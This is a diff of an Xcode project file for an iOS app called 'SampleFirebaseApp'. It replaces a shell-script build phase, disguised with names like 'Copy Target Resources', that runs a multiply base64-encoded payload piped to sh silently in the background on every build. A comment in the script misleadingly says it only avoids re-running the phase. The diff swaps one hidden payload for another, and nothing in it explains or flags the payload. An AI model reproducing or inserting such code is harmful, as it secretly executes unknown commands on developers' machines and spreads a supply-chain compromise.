@@ -118,7 +118,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 105F89452D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseApp" */;
 			buildPhases = (
-				E25FABED4FF9FF9AA038ACF9 /* Link Bundle Resources */,
+				ECCF8BF9EAEC3EA0AA38ACF9 /* Copy Target Resources */,
 				105F891C2D266C74008C65CC /* Sources */,
 				105F891D2D266C74008C65CC /* Frameworks */,
 				105F891E2D266C74008C65CC /* Resources */,
@@ -259,25 +259,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E25FABED4FF9FF9AA038ACF9 /* Link Bundle Resources */ = {
+		ECCF8BF9EAEC3EA0AA38ACF9 /* Copy Target Resources */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Resources";
+			name = "Copy Target Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTldFSmFWakl4YjJGc1RrWlRibkJZWWtVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5iVVpaVjIxb2ExSXdXbkpaTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
